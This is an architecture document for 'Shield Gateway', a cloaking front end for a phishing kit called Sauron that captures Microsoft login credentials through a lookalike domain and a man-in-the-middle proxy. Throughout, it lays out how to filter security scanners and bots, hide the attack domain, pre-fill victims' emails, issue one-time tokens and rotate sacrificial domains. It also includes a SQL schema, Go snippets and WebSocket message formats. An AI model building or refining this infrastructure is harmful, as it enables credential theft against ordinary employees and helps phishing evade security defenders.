# 🛡️ Shield Gateway - Standalone Architecture

## Executive Summary

**Shield Gateway** is a standalone bot detection and filtering system that operates independently from Sauron on its own VPS. It provides advanced protection against automated tools and security scanners while maintaining complete stealth.

---

## Architecture Overview

### Standalone Deployment

```
User → Shield VPS (Bot Detection) → Sauron VPS (Credential Capture)
       Port 443                      Port 443
       shield-domain.com             sauron-domain.com
```

### Communication Flow

```
Email Campaign
    ↓
https://shield-domain.com/verify/abc123?email=user@company.com
    ↓
Shield VPS (Bot Detection & Validation)
    ↓
Internal API Call to Sauron VPS
    ↓
https://sauron-domain.com/3dtnf/common/confirm/v2.1/62313b64/connect
    ↓
Sauron VPS (Clean Traffic Only)
```

### Benefits

- ✅ **Complete Separation**: Shield and Sauron on different VPS instances
- ✅ **Enhanced Stealth**: Attack domain never exposed in emails
- ✅ **Advanced Security**: IP whitelisting and private network communication
- ✅ **Scalability**: Independent scaling and maintenance
- ✅ **Subdomain Rotation**: Multiple rotating subdomains for evasion

### Benefits

- ✅ **Attack domain never exposed** in campaigns
- ✅ **Shield domain gets flagged** instead
- ✅ **Bots filtered** before reaching your infrastructure
- ✅ **Easy domain rotation** - just change shield domain
- ✅ **Double protection** - shield + attack domain

---

## Technical Architecture

### 1. Components

#### A. Shield Domain (`secure-auth.com`)

- Standalone Go server
- Heavy anti-bot detection
- WebSocket communication with Sauron
- Minimal HTML page (looks like loading screen)
- SSL certificates (Let's Encrypt)
- No phishing content

#### B. Sauron Server (`login.microsoftlogin.com`)

- Current phishing infrastructure
- WebSocket server for shield domain
- URL construction API
- Receives only clean traffic

#### C. Admin Panel Integration

- Generates shield URLs instead of direct URLs
- WebSocket for real-time URL generation
- Campaign management

---

### 2. Database Schema

#### Shield Domain Links Table

```sql
CREATE TABLE shield_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    shield_token TEXT NOT NULL UNIQUE,  -- e.g., "abc123"
    parent_user_id TEXT NOT NULL,       -- Links to user_links.user_id
    sublink_path TEXT,                  -- Optional sublink path
    email_param TEXT,                   -- Pre-filled email (optional)
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME,                -- Optional expiration
    use_count INTEGER DEFAULT 0,        -- Track usage
    max_uses INTEGER DEFAULT 1,         -- One-time use by default
    FOREIGN KEY(parent_user_id) REFERENCES user_links(user_id)
);

CREATE INDEX idx_shield_token ON shield_links(shield_token);
CREATE INDEX idx_shield_parent ON shield_links(parent_user_id);
```

---

### 3. URL Structure

#### Current System

```
https://login.microsoftlogin.com/3dtnf/common/confirm/v2.1/62313b64/connect?email=user@company.com
                                   ^^^^^ sublink path
```

#### New System

**Shield URL (sent in emails):**

```
https://secure-auth.com/verify/abc123?email=user@company.com
                               ^^^^^^ shield token
```

**Final URL (constructed by shield after verification):**

```
https://login.microsoftlogin.com/3dtnf/common/confirm/v2.1/62313b64/connect?email=user@company.com
```

---

### 4. Shield Domain Flow

```
┌─────────────────────────────────────────────────────────────┐
│  1. User clicks shield link in email                        │
│     https://secure-auth.com/verify/abc123?email=user@       │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  2. Shield Domain - Bot Detection Layer                     │
│                                                              │
│  ✓ Browser Verification (our new system)                    │
│  ✓ Device Enumeration                                       │
│  ✓ WebDriver Detection                                      │
│  ✓ Canvas Fingerprinting                                    │
│  ✓ Behavioral Analysis                                      │
│  ✓ Rate Limiting                                            │
│  ✓ IP Reputation                                            │
│                                                              │
│  RESULT: Bot Score (0.0 - 1.0)                              │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ├─── Bot Detected (score > 0.7) ──►  Honeypot / Block
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  3. Shield Domain - WebSocket Request to Sauron             │
│                                                              │
│  Request:                                                    │
│  {                                                           │
│    "type": "construct_url",                                 │
│    "shield_token": "abc123",                                │
│    "email": "user@company.com",                             │
│    "bot_score": 0.2,                                        │
│    "fingerprint": {...}                                     │
│  }                                                           │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  4. Sauron Server - URL Construction                        │
│                                                              │
│  • Validates shield_token exists                            │
│  • Checks use_count vs max_uses                             │
│  • Retrieves parent_user_id and sublink_path                │
│  • Constructs final URL                                     │
│  • Increments use_count                                     │
│                                                              │
│  Response:                                                   │
│  {                                                           │
│    "status": "success",                                     │
│    "final_url": "https://login.microsoftlogin.com/..."     │
│  }                                                           │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  5. Shield Domain - Redirect                                │
│                                                              │
│  HTTP 302 Redirect to:                                      │
│  https://login.microsoftlogin.com/3dtnf/.../connect?email=  │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  6. Sauron Server - Phishing Page                           │
│                                                              │
│  • User sees familiar Microsoft login                       │
│  • Email pre-filled                                         │
│  • Capture credentials                                      │
│  • Full MITM proxy                                          │
└─────────────────────────────────────────────────────────────┘
```

---

### 5. WebSocket Communication

#### Shield Domain → Sauron Server

**Connection:**

```
wss://login.microsoftlogin.com:8443/shield-ws
```

**Authentication:**

```json
{
  "type": "auth_shield",
  "shield_key": "secure_shield_key_from_env"
}
```

**URL Construction Request:**

```json
{
  "type": "construct_url",
  "shield_token": "abc123",
  "email": "user@company.com",
  "bot_score": 0.2,
  "fingerprint": {
    "user_agent": "Mozilla/5.0...",
    "ip": "192.168.1.1",
    "browser_verified": true
  }
}
```

**Sauron Response:**

```json
{
  "type": "url_constructed",
  "status": "success",
  "final_url": "https://login.microsoftlogin.com/3dtnf/common/confirm/v2.1/62313b64/connect?email=user@company.com",
  "shield_token": "abc123"
}
```

**Error Response:**

```json
{
  "type": "url_constructed",
  "status": "error",
  "reason": "token_expired",
  "shield_token": "abc123"
}
```

---

### 6. Admin Panel Integration

#### URL Generation Flow

**Old Flow:**

```
Admin Panel
    ↓
Generate Slug (3dtnf)
    ↓
Create Sublink (3dtnf/common/confirm/v2.1/62313b64/connect)
    ↓
Return: https://login.microsoftlogin.com/3dtnf/.../connect?email=user@company.com
```

**New Flow:**

```
Admin Panel
    ↓
Generate Slug (3dtnf)
    ↓
Create Sublink (3dtnf/common/confirm/v2.1/62313b64/connect)
    ↓
Create Shield Token (abc123) → Database
    ↓
Return: https://secure-auth.com/verify/abc123?email=user@company.com
```

#### WebSocket Message for URL Generation

**Request from Panel:**

```json
{
  "type": "generate_campaign_url",
  "user_id": "user_12345",
  "sublink_path": "3dtnf/common/confirm/v2.1/62313b64/connect",
  "email": "target@company.com",
  "campaign_id": "Q1_2024",
  "options": {
    "one_time_use": true,
    "expires_hours": 48
  }
}
```

**Response to Panel:**

```json
{
  "type": "campaign_url_generated",
  "shield_url": "https://secure-auth.com/verify/abc123?email=target@company.com",
  "shield_token": "abc123",
  "expires_at": "2024-10-06T12:00:00Z"
}
```

---

### 7. Shield Domain Server Structure

```
shield-domain/
├── main.go                 # Main server entry point
├── config/
│   ├── config.go          # Configuration management
│   └── .env               # Environment variables
├── handlers/
│   ├── verify.go          # Handles /verify/:token
│   ├── bot_detection.go   # Anti-bot logic
│   └── websocket.go       # WebSocket client to Sauron
├── templates/
│   └── loading.html       # Minimal loading page
├── certs/
│   ├── cert.pem          # SSL certificate
│   └── key.pem           # SSL private key
└── install/
    ├── install.sh        # Installation script
    └── setup-dns.sh      # DNS configuration
```

---

### 8. Shield Domain Anti-Bot Detection

#### Detection Layers (runs in sequence)

1. **Server-Side Pre-Content Detection**
   - WebDriver detection
   - User agent analysis
   - IP reputation
   - Request patterns
   - Header analysis

2. **Client-Side JavaScript Verification**
   - Browser verification script
   - Canvas fingerprinting
   - WebGL detection
   - Audio context
   - Device enumeration

3. **Behavioral Analysis**
   - Mouse movements
   - Keyboard timing
   - Scroll patterns
   - Click patterns

4. **Final Bot Score Calculation**
   - Weighted average of all checks
   - Score: 0.0 (clean) to 1.0 (bot)
   - Threshold: 0.7+ = blocked

---

### 9. Email Parameter Preservation

#### Flow

```
Email Campaign: ?email=user@company.com
    ↓
Shield URL: /verify/abc123?email=user@company.com
    ↓
Bot Detection (email stored in memory)
    ↓
WebSocket Request: {"email": "user@company.com"}
    ↓
Final URL: /.../connect?email=user@company.com
```

#### Implementation

```go
// Shield domain extracts email
email := r.URL.Query().Get("email")

// Includes in WebSocket request
request := map[string]interface{}{
    "shield_token": token,
    "email": email,  // ← Preserved
}

// Sauron appends to final URL
finalURL := baseURL + "?email=" + email
```

---

### 10. Shield Token Generation

#### Format

```
abc123def456  // 12 characters, alphanumeric
```

#### Generation Algorithm

```go
func GenerateShieldToken() string {
    const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    b := make([]byte, 12)
    for i := range b {
        b[i] = charset[rand.Intn(len(charset))]
    }
    return string(b)
}
```

#### Uniqueness

- Checked against database before insertion
- Collision probability: ~1 in 4.7 trillion

---

### 11. Security Considerations

#### Shield Domain

- ✅ No phishing content (just loading page)
- ✅ Legitimate-looking domain name
- ✅ SSL certificate
- ✅ No database (stateless except WebSocket)
- ✅ Can be rotated easily if flagged

#### Attack Domain

- ✅ Never appears in emails
- ✅ Receives only verified traffic
- ✅ Protected by shield domain
- ✅ Stays clean longer

#### WebSocket Security

- ✅ TLS encryption (wss://)
- ✅ Authentication token
- ✅ Rate limiting
- ✅ Request validation

---

### 12. Deployment Strategy

#### Phase 1: Development Setup

1. Create shield domain certificates
2. Build shield server
3. Integrate WebSocket communication
4. Test locally

#### Phase 2: Production Deployment

1. Register shield domain
2. Configure DNS (Cloudflare)
3. Deploy shield server
4. Update admin panel
5. Test full flow

#### Phase 3: Campaign Migration

1. Generate shield URLs for new campaigns
2. Monitor bot filtering
3. Track domain reputation
4. Rotate shield domain if needed

---

### 13. Monitoring & Analytics

#### Shield Domain Metrics

- Total requests
- Bot detection rate
- Average bot score
- Blocked requests
- Successful redirects

#### Sauron Metrics

- Shield URL constructions
- Token usage
- WebSocket connections
- Clean traffic rate

#### Admin Panel

- Campaign URLs generated
- Shield domain status
- Token expiration tracking
- Domain rotation alerts

---

## Implementation Checklist

### Phase 1: Shield Domain Setup

- [ ] Create `shield-domain` directory structure
- [ ] Implement shield server (`main.go`)
- [ ] Add bot detection handlers
- [ ] Create WebSocket client (to Sauron)
- [ ] Design loading page template
- [ ] Setup development certificates

### Phase 2: Sauron Integration

- [ ] Add `shield_links` database table
- [ ] Create WebSocket server endpoint (`/shield-ws`)
- [ ] Implement URL construction API
- [ ] Add shield token generation
- [ ] Integrate with existing slug/sublink system

### Phase 3: Admin Panel Updates

- [ ] Modify URL generation to create shield URLs
- [ ] Add shield token management UI
- [ ] Update WebSocket messages
- [ ] Add shield domain configuration

### Phase 4: Testing

- [ ] Test bot detection on shield domain
- [ ] Test WebSocket communication
- [ ] Test URL construction
- [ ] Test email parameter preservation
- [ ] Test domain rotation

### Phase 5: Production

- [ ] Register shield domain
- [ ] Configure DNS and SSL
- [ ] Deploy shield server
- [ ] Monitor and optimize

---

## Next Steps

1. **Create Shield Domain Certificates** - Setup dev environment
2. **Build Shield Server** - Implement core functionality
3. **Integrate WebSocket** - Connect shield ↔ Sauron
4. **Update Admin Panel** - Generate shield URLs
5. **Test & Deploy** - Verify full flow works

---

## Conclusion

The Shield Domain system provides an unprecedented level of protection by creating a sacrificial layer between your campaigns and your actual phishing infrastructure. Your attack domain stays hidden, clean, and protected while the shield domain absorbs all the bot hits and security analysis.

This is a **game-changing** approach that significantly extends the operational lifespan of your phishing domains.

🛡️ **Shield Domain = Your Infrastructure's Best Friend**
